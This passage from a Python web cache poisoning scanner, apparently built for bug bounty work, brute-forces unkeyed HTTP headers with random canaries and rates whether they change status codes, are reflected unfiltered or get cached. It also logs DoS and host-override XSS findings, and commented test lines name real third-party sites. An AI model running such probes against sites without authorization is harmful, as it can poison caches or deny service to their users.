            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: evil user-agent attack through: {}".format(attack_result[1]), "green"))
    except Exception as e:
        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
        pass

    try:
        attack_result = attack_host_override(url, initial_response)
        ret_val.xss_host_override = attack_result
        if attack_result[0]:
            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
            logging.critical(termcolor.colored("[!]: [DOS/XSS ATTACK]: host override through: {}".format(attack_result[1]), "green"))
    except Exception as e:
        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
        pass

    try:
        attack_result = attack_port_dos(url, initial_response)
        ret_val.dos_host_header_port = attack_result
        if attack_result[0]:
            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: port DoS through: {}".format(attack_result[1]), "green"))
    except Exception as e:
        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
        pass

    try:
        attack_result = attack_illegal_header(url, initial_response)
        ret_val.dos_illegal_header = attack_result
        if attack_result[0]:
            logging.critical(termcolor.colored("[!]: ATTACK REPORT FOR \"{}\" ON: \"{}\"".format(program_name, url), "green"))
            logging.critical(termcolor.colored("[!]: [DOS ATTACK]: illegal header attack through: \"{}\"".format(attack_result[1]), "green"))
    except Exception as e:
        logging.error(termcolor.colored("[E]: Exception ocurred: " + str(e), "red"))
        pass

    return ret_val

############################
### HEADER BRUTE-FORCING ###
############################

#
# This function recieves a short list of headers and determines which ones cause a response change
# through a binary search-like algorithm
#
def header_bin_search(url, header_list):
    #fetch a normal response to compare following responses to it.
    try:
        initial_response = httpx.request("GET", url, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                              "accept":"*/*, text/stuff",
                                                              "origin":"https://www.example.com"})
    except:
        return []
  
    header_group_list = [header_list]
    
    while (True):
        #go over every header group, make a request, check the responses, if ordinary, remove from list.
        eliminated_indices = []

        for i in range(len(header_group_list)):
            cache_buster = "cache" + gen_rand_str(8)
            canary = "canary" + gen_rand_str(8)

            base_headers = {"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                            "accept":"*/*, text/" + cache_buster,
                            "origin":"https://" + cache_buster + ".example.com"}
            request_headers = base_headers

            for header in header_group_list[i]:
                request_headers[header] = canary
            
            try:
                response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers=request_headers)
            except:
                header_group_list[i] = None
                continue

            if (response.status_code != initial_response.status_code) or (canary in response.text) or any(canary in value for value in response.headers.values()):
                pass
            else:
                header_group_list[i] = None
        
        header_group_list = [header_group for header_group in header_group_list if header_group != None]
        
        #now that useless header groups are removed, check if we have any left and split them
        if (len(header_group_list) == 0):
            #all headers are invalid, return.
            return []
        elif (all((len(header_group) == 1) for header_group in header_group_list)):
            #cannot split further, the headers left are the useful ones, return them.
            return [header[0] for header in header_group_list]
        else:
            #there are still header groups left to split
            new_header_group_list = []
            for header_group in header_group_list:
                if len(header_group) > 1:
                    new_header_group_list.append(header_group[:len(header_group)//2])
                    new_header_group_list.append(header_group[len(header_group)//2:])
            header_group_list = new_header_group_list

#
# Helper function that runs header_bin_search iteratively over a list of header lists
#
def header_bin_search_helper(url, header_group_list):
    retval = []
    for header_group in header_group_list:
        retval = retval + header_bin_search(url, header_group)
    return retval

#
# This function divides the large header list into manageable chunks and 
# uses multithreading to test all of them on a target
#
def header_bruteforce(url, header_count=15, thread_count=5):
    logging.info(termcolor.colored("[i]: Initiating header bruteforce on \"{}\"".format(url), "blue"))
    #fetching headers and splitting them into header_count long chunks, and then again into thread_count chuncks
    headers = open("lists/headers.txt", "r").read().splitlines()
    header_group_list = [headers[i:i + header_count] for i in range(0, len(headers), header_count)]
    header_group_list_list = [header_group_list[i:i + thread_count] for i in range(0, len(header_group_list), thread_count)]

    #execute concurrently
    executor = concurrent.futures.ThreadPoolExecutor()
    executor_results = executor.map(header_bin_search_helper, itertools.repeat(url), header_group_list_list)
    retval = []
    for header_list in list(executor_results):
        retval = retval + header_list
    executor.shutdown()
    return retval


###########################
### SEVERITY ASSESSMENT ###
###########################

#
# To assess the severity of interesting headers after a header-bruteforce, we check:
#   - is the response cached?
#   - is the header content reflected in the body?
#   |--> where is it reflected (inside scripts, tags, tag attributes)?
#    `-> is it filtered? can we escape the context?
#   - is the header content reflected in response headers?
#   |--> are they important headers? e.g. location, x-frame-options, x-allow-credentials, x-allow-origin, etc...
#    `-> are they escapeable? can we use http header injection?
#   - does it cause response code change? see cacheability 
#
# For every header this function returns a tuple in the following form:
# ( is_response_cacheable, is_status_code_changed, new_status_code, is_body_reflected, is_body_unfiltered, is_header_reflected, reflection_header_names )
#
def assess_header_severity(url, header):
    is_response_cacheable = False
    is_status_code_changed = False
    new_status_code = 0
    is_body_reflected = False
    is_body_unfiltered = False
    is_header_reflected = False
    reflection_header_names = []

    cache_buster = "cache" + gen_rand_str(8)

    try:
        initial_response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                                     "accept":"*/*, text/" + cache_buster,
                                                                                                     "origin":"https://" + cache_buster + ".example.com"})
        cache_buster = "cache" + gen_rand_str(8)
        canary = "canary" + gen_rand_str(8)
        poisoned_response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                                "accept":"*/*, text/" + cache_buster,
                                                                                                "origin":"https://" + cache_buster + ".example.com",
                                                                                                header:canary})
    except:
        return (is_response_cacheable, is_status_code_changed, new_status_code, is_body_reflected, is_body_unfiltered, is_header_reflected, reflection_header_names)

    #check for status code change
    if poisoned_response.status_code != initial_response.status_code:
        is_status_code_changed = True
        new_status_code = poisoned_response.status_code
    
    #check for response header reflection
    for header_value_pair in poisoned_response.headers.items():
        if canary in header_value_pair[1]:
            is_header_reflected = True
            reflection_header_names.append(header_value_pair[0])

    #check for response body reflection
    if canary in poisoned_response.text:
        is_body_reflected = True

    #check for cacheability
    try:
        poisoned_response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                                      "accept":"*/*, text/" + cache_buster,
                                                                                                      "origin":"https://" + cache_buster + ".example.com"})
    except:
        return (is_response_cacheable, is_status_code_changed, new_status_code, is_body_reflected, is_body_unfiltered, is_header_reflected, reflection_header_names)

    if is_status_code_changed and poisoned_response.status_code == new_status_code:
        is_response_cacheable = True
    
    if is_header_reflected and any([(canary in header_value) for header_value in poisoned_response.headers.values()]):
        is_response_cacheable = True
    
    if is_body_reflected and canary in poisoned_response.text:
        is_response_cacheable = True

    #check for filtering in the body, kind of dumb considering alot of situations wouldn't be detected by this
    if is_body_reflected:
        cache_buster = "cache" + gen_rand_str(8)
        canary = "canary" + gen_rand_str(8) + "\"<>"
        poisoned_response = httpx.request("GET", url, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
                                                                                                      "accept":"*/*, text/" + cache_buster,
                                                                                                      "origin":"https://" + cache_buster + ".example.com",
                                                                                                      header:canary})
        if canary in poisoned_response.text:
            is_body_unfiltered = True

    return (is_response_cacheable, is_status_code_changed, new_status_code, is_body_reflected, is_body_unfiltered, is_header_reflected, reflection_header_names)
    
#
# execute assess_header_severity concurrently and with console output
#
def assess_severity(url, program_name, headers, thread_count = 5):
    #splitting headers into thread_count long chunks
    header_group_list = [headers[i:i + thread_count] for i in range(0, len(headers), thread_count)]

    header_assessments = []
    #execute concurrently
    for header_group in header_group_list:
        executor = concurrent.futures.ThreadPoolExecutor()
        executor_results = executor.map(assess_header_severity, itertools.repeat(url), header_group)
        header_assessments = header_assessments + list(executor_results)
        executor.shutdown()

    #print the results to the console
    for i in range(len(header_assessments)):
        msg = "[!]: HEADER REPORT FOR \"{2}\": \"{0}\" On \"{1}\"\n  > ".format(headers[i], url, program_name)
        msg_color = "red"

        #some rate limiting stuff may cause false postives for headers
        should_print = False

        if header_assessments[i][0]:
            msg += "Cacheable Response. "
            msg_color = "green"
        if header_assessments[i][1]:
            should_print = True
            msg += "HTTP Status Code Modified To {0}. ".format(header_assessments[i][2])
        if header_assessments[i][3]:
            should_print = True
            msg += "Reflected "
            if header_assessments[i][4]:
                msg += "Unfiltered "
            msg += "Value in Response Body. "
        if header_assessments[i][5]:
            should_print = True
            msg += "Reflected Value in Response Headers {0}.".format(header_assessments[i][6])

        if should_print:
            if header_assessments[i][0]:
                logging.critical(termcolor.colored(msg, msg_color))
            else:
                logging.warning(termcolor.colored(msg, msg_color))

    return header_assessments

#logging.basicConfig(level=logging.INFO, format='%(message)s')
#print_banner()

#test
#specific_attacks("https://www.google.com/")
#assess_severity("https://assets.finn.no/pkg/frontpage-podium/2.0.70/scripts.js", header_bruteforce("https://assets.finn.no/pkg/frontpage-podium/2.0.70/scripts.js"))